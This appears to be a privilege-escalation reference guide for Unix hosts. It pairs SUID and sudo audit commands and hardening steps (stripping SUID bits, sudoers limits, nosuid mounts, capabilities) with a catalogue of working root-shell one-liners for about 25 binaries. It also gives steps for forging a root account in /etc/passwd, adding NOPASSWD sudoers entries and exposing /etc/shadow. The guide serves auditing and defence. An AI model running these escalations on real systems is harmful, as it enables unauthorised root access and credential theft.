# GTFOBins & Privilege Escalation Reference Guide

A comprehensive security manual detailing Unix binaries vulnerable to privilege escalation, subshell breakout, arbitrary file read/write, and sudo misuse. Includes SUID bit mechanics, attack vectors, detection commands, and defensive hardening configurations.

---

## 1. Fundamentals: SUID, SGID & Sudo Architecture

### Linux Permission Bits & File Modes
In POSIX filesystems, permissions are represented as octal modes:
* **SUID (Set User ID - `0o4000` / bit 12):** When an executable with the SUID bit set is executed, the process assumes the Effective User ID (EUID) of the file owner (typically `root`) rather than the executing user.
* **SGID (Set Group ID - `0o2000` / bit 11):** The process assumes the Effective Group ID (EGID) of the file group.
* **Sticky Bit (`0o1000`):** Applied to directories (like `/tmp`) to ensure only file owners or root can delete or rename files.

```text
Special Bits Octal Mask:
  0o4000  -> SUID (rwsr-xr-x)
  0o2000  -> SGID (rwxr-sr-x)
  0o1000  -> Sticky (rwxrwxrwt)
```

In Python, the SUID check is performed via:
```python
is_suid = bool(stat_result.st_mode & 0o4000)
is_sgid = bool(stat_result.st_mode & 0o2000)
```

### The SUID Privilege Escalation Hazard
If a binary owned by `root` has the SUID bit set (`-rwsr-xr-x 1 root root`), any unprivileged user running that binary runs code as `root`. If that binary provides features to execute subshells, evaluate code, read arbitrary files, or write arbitrary files, the user can instantly achieve full administrative control.

### Sudo Misconfigurations
The `/etc/sudoers` file defines delegated privileges. Critical misconfigurations include:
1. **`NOPASSWD: ALL`**: Direct passwordless execution of any command as root.
2. **Wildcards and Script Wrappers**: Allowing `sudo /usr/bin/find` or `sudo /usr/bin/python` without restrictions allows attackers to execute subshells via embedded flags.
3. **Environment Preservation (`env_keep`, `LD_PRELOAD`)**: If `sudo` preserves dynamic linker environment variables, an attacker can load an arbitrary shared library into root processes:
   ```text
   Defaults env_keep += "LD_PRELOAD LD_LIBRARY_PATH" # CRITICAL VULNERABILITY
   ```

---

## 2. Host Audit & Discovery Commands

### Discover All SUID/SGID Binaries on the Host
```bash
# Locate all SUID files owned by root
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null

# Locate all SGID files
find / -perm -2000 -type f -exec ls -la {} + 2>/dev/null

# Filter against standard GTFOBins binaries
find / -perm -4000 -type f 2>/dev/null | grep -E '/(bash|sh|python|perl|ruby|find|vim|vi|nano|cp|mv|awk|sed|tar|zip|less|more|env|nmap|pkexec|tee|chmod|chown|gdb|node|php)$'
```

### Audit Delegated Sudo Capabilities
```bash
# Check current user's delegated sudo permissions
sudo -l
```

### Automated CLI Host Posture Audit
```bash
python3 .agents/skills/cybersec/scripts/cybersec host
python3 .agents/skills/cybersec/scripts/cybersec host --json
```

### Audit System PATH and Writable Executable Directories
A common privilege escalation vector occurs when `$PATH` contains world-writable directories, relative paths (such as `.` or empty entries `::`), or insecure user-writable directories ordered prior to trusted system paths (`/usr/bin`, `/bin`). If a root cronjob or SUID binary calls a command using an unqualified name (e.g., `tar` or `python`), an attacker can plant a trojan binary in the writable directory.

```bash
# Check for relative or empty PATH components (leading/trailing/doubled colons or '.')
echo "$PATH" | grep -E '(^|:)(\.|\.\.|)(:|$)'

# Find world-writable or user-writable directories in $PATH
echo "$PATH" | tr ':' '\n' | while read -r p; do
  if [ -d "$p" ]; then
    perms=$(ls -ld "$p" | awk '{print $1, $3, $4}')
    if [ -w "$p" ]; then
      echo "[!] CRITICAL: Writable PATH directory: $p ($perms)"
    else
      echo "[-] Secure: $p ($perms)"
    fi
  fi
done
```

---

## 3. GTFOBins Binary Catalogue & Escalation Vectors

The following reference details each critical binary, its escalation classification (SUID vs. Sudo), the exact execution syntax, and the operational mechanism.

---

### `bash`
* **Mechanics:** Bash drops SUID privileges by default unless executed with the `-p` (`--norc -p`) flag.
* **SUID Escalation:**
  ```bash
  /usr/bin/bash -p
  # EUID remains 0 (root); confirms with: id
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo bash
  ```

---

### `sh`
* **Mechanics:** Similar to bash, modern shells (e.g. `dash` or `bash` symlinked to `sh`) drop privileges unless `-p` is provided.
* **SUID Escalation:**
  ```bash
  /usr/bin/sh -p
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo sh
  ```

---

### `python` / `python3`
* **Mechanics:** Executes arbitrary Python code with direct access to standard library system calls (`os.setuid`, `pty.spawn`).
* **SUID Escalation:**
  ```bash
  # Python does not drop privileges automatically; set EUID to 0
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

---

### `perl`
* **Mechanics:** Perl's `POSIX` module allows resetting UID/GID before spawning a shell.
* **SUID Escalation:**
  ```bash
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo perl -e 'exec "/bin/sh";'
  ```

---

### `ruby`
* **Mechanics:** Direct process manipulation via `Process::Sys.setuid`.
* **SUID Escalation:**
  ```bash
  ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo ruby -e 'exec "/bin/sh"'
  ```

---

### `find`
* **Mechanics:** The `-exec` flag spawns a process for matching items. When SUID or sudo is enabled, the executed process inherits the elevated context.
* **SUID Escalation:**
  ```bash
  find . -exec /bin/sh -p \; -quit
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo find . -exec /bin/sh \; -quit
  ```

---

### `vim` / `vi`
* **Mechanics:** Interactive editors support shell escapes (`:!command`) and internal scripting engines (Python/Lua).
* **SUID Escalation:**
  ```bash
  vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo vim -c ':!/bin/sh'
  # Or inside vim, type:
  # :set shell=/bin/sh
  # :shell
  ```

---

### `nano`
* **Mechanics:** Nano supports executing external helper commands via the file insert feature (`Ctrl+R`, `Ctrl+X`).
* **SUID / Sudo Escalation:**
  ```bash
  sudo nano
  # 1. Press: Ctrl + R
  # 2. Press: Ctrl + X
  # 3. Enter command: reset; sh 1>&0 2>&0
  # 4. Press Enter -> Drops into interactive root shell
  ```

---

### `cp`
* **Mechanics:** Can overwrite critical system files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) or copy a shell into a protected location.
* **SUID / Sudo Escalation:**
  ```bash
  # Generate a known root entry with password 'password'
  # openssl passwd -1 -salt xyz password -> $1$xyz$p71u7mfl.M9smq1wP5k7V/
  echo 'root2:$1$xyz$p71u7mfl.M9smq1wP5k7V/:0:0:root:/root:/bin/bash' > /tmp/passwd.patch
  
  # Append to existing /etc/passwd or overwrite
  cp /etc/passwd /tmp/passwd.bak
  cat /tmp/passwd.bak /tmp/passwd.patch > /tmp/passwd.new
  sudo cp /tmp/passwd.new /etc/passwd
  su root2 # password is: password
  ```

---

### `mv`
* **Mechanics:** Arbitrary file replacement. Can replace `/etc/shadow` or overwrite system binaries.
* **SUID / Sudo Escalation:**
  ```bash
  # Move forged passwd/shadow into system location
  sudo mv /tmp/forged_shadow /etc/shadow
  ```

---

### `awk`
* **Mechanics:** Built-in `system()` function executes arbitrary shell commands.
* **SUID Escalation:**
  ```bash
  awk 'BEGIN {system("/bin/sh")}'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo awk 'BEGIN {system("/bin/sh")}'
  ```

---

### `sed`
* **Mechanics:** Sed can execute commands via the `e` flag or write arbitrary content to files.
* **SUID / Sudo Escalation:**
  ```bash
  # Execute shell
  sudo sed -n '1e exec sh 1>&0' /etc/hosts

  # Arbitrary file read with SUID sed
  sed '' /etc/shadow
  ```

---

### `tar`
* **Mechanics:** Tar checkpoint actions allow command execution when processing archives.
* **SUID / Sudo Escalation:**
  ```bash
  # Checkpoint action command execution
  tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  
  # Via sudo
  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  ```

---

### `zip`
* **Mechanics:** The `-T` (test) and `-TT` (unzip command) options evaluate shell commands.
* **SUID / Sudo Escalation:**
  ```bash
  TF=$(mktemp -u)
  zip "$TF" /etc/hosts -T -TT 'sh #'
  rm -f "$TF"
  ```

---

### `less` / `more`
* **Mechanics:** Pagers allow spawning interactive subshells by escaping the viewer prompt.
* **SUID / Sudo Escalation:**
  ```bash
  # Start pager
  sudo less /etc/hosts
  # Type:
  !/bin/sh
  # Press Enter -> Interactive root shell
  ```

---

### `env`
* **Mechanics:** Utility to run a command in an altered environment.
* **SUID Escalation:**
  ```bash
  env /bin/sh -p
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo env /bin/sh
  ```

---

### `nmap`
* **Mechanics:** Older versions supported `--interactive`; modern versions support running NSE Lua scripts.
* **SUID / Sudo Escalation:**
  ```bash
  # Older nmap
  nmap --interactive
  nmap> !sh

  # Modern nmap via Lua script execution
  TF=$(mktemp)
  echo 'os.execute("/bin/sh")' > "$TF"
  sudo nmap --script="$TF"
  rm -f "$TF"
  ```

---

### `pkexec`
* **Mechanics:** Polkit command execution helper. Historically vulnerable to out-of-bounds argument injection (CVE-2021-4034 "PwnKit").
* **SUID Escalation:**
  ```bash
  # Direct invocation if user has polkit authorization
  pkexec /bin/sh
  ```

---

### `tee`
* **Mechanics:** Writes standard input to files. Can append malicious lines to `/etc/sudoers` or `/etc/passwd`.
* **SUID / Sudo Escalation:**
  ```bash
  # Add unprivileged user to sudoers without password prompt
  echo "$USER ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
  sudo -i
  ```

---

### `chmod`
* **Mechanics:** Can change file permissions to grant full access or make any binary SUID.
* **SUID / Sudo Escalation:**
  ```bash
  # Make /bin/bash SUID
  sudo chmod 4755 /bin/bash
  /bin/bash -p
  
  # Or make /etc/shadow world-readable
  sudo chmod 666 /etc/shadow
  cat /etc/shadow
  ```

---

### `chown`
* **Mechanics:** Changes ownership of system files.
* **SUID / Sudo Escalation:**
  ```bash
  # Take ownership of /etc/passwd or /etc/shadow
  sudo chown $USER /etc/shadow
  chmod 600 /etc/shadow
  # Modify /etc/shadow directly
  ```

---

### `gdb`
* **Mechanics:** The GNU debugger supports shell escapes and Python extensions.
* **SUID Escalation:**
  ```bash
  gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo gdb -nx -ex '!sh' -ex quit
  ```

---

### `node`
* **Mechanics:** Node.js executes JavaScript with direct child process and POSIX system call capabilities.
* **SUID Escalation:**
  ```bash
  node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  ```

---

### `php`
* **Mechanics:** PHP CLI can invoke `system()` or `posix_setuid()`.
* **SUID Escalation:**
  ```bash
  php -r "posix_setuid(0); system('/bin/sh');"
  ```
* **Sudo (`NOPASSWD`):**
  ```bash
  sudo php -r "system('/bin/sh');"
  ```

---

## 4. Hardening & Defensive Remediation

### Step 1: Remove Dangerous SUID / SGID Bits
Audit the host system and strip SUID bits from binaries that do not require them:
```bash
# Remove SUID bit from specific binary
sudo chmod u-s /usr/bin/find
sudo chmod u-s /usr/bin/vim
sudo chmod u-s /usr/bin/python3

# Remove SGID bit
sudo chmod g-s /usr/bin/some_binary
```

#### Automated SUID Stripping Script
```bash
#!/usr/bin/env bash
set -euo pipefail

DANGEROUS_BINS=(
  bash sh python python3 perl ruby find vim vi nano
  cp mv awk sed tar zip less more env nmap pkexec
  tee chmod chown gdb node php
)

for bin in "${DANGEROUS_BINS[@]}"; do
  paths=$(which "$bin" 2>/dev/null || true)
  for p in $paths; do
    if [ -u "$p" ]; then
      echo "[!] Stripping SUID bit from: $p"
      chmod u-s "$p"
    fi
  done
done
```

### Step 2: Restrict Sudoers Configuration
1. **Never delegate wildcards or shell-capable binaries:**
   ```text
   # INSECURE:
   deploy ALL=(ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3
   
   # SECURE: Wrap in an unmodifiable script with strict arguments
   deploy ALL=(root) NOPASSWD: /usr/local/bin/deploy-service.sh
   ```
2. **Prevent environment manipulation (`env_reset`):**
   Ensure `/etc/sudoers` contains:
   ```text
   Defaults env_reset
   Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
   ```
3. **Use the `NOEXEC` tag for viewers and non-shell binaries:**
   ```text
   alice ALL=(ALL) NOEXEC: /usr/bin/less /var/log/*
   ```

### Step 3: Filesystem Mount Flags
Configure `/etc/fstab` to disable execution and SUID bits on shared and temporary partitions:
```text
# /etc/fstab
tmpfs       /tmp          tmpfs   defaults,nosuid,nodev,noexec   0 0
tmpfs       /var/tmp      tmpfs   defaults,nosuid,nodev,noexec   0 0
tmpfs       /dev/shm      tmpfs   defaults,nosuid,nodev,noexec   0 0
```

### Step 4: Migrate from SUID to Granular Linux Capabilities
Instead of granting monolithic SUID root permissions, assign only the necessary Linux capability:
```bash
# INSECURE: Making ping or web servers SUID root
chmod 4755 /usr/bin/my_server

# SECURE: Grant only capability to bind low ports (80/443)
sudo setcap 'cap_net_bind_service=+ep' /usr/bin/my_server

# Audit active capabilities on system
getcap -r / 2>/dev/null
```

### Step 5: System PATH Auditing & Hardening
1. **Always Enforce `secure_path` in Sudoers:**
   Ensure `/etc/sudoers` specifies a sanitized, immutable search path for elevated executions:
   ```text
   Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
   ```
2. **Never Invoke Unqualified Binary Names in Privileged Scripts:**
   Always use absolute paths (e.g., `/usr/bin/find`, `/bin/tar`) in shell scripts run by root, systemd services, and cron jobs.
3. **Verify Directory Permissions in System PATH:**
   Ensure every directory referenced in `/etc/environment`, `/etc/profile`, and daemon unit files is owned exclusively by `root:root` with permissions `755` (`drwxr-xr-x`) or stricter.
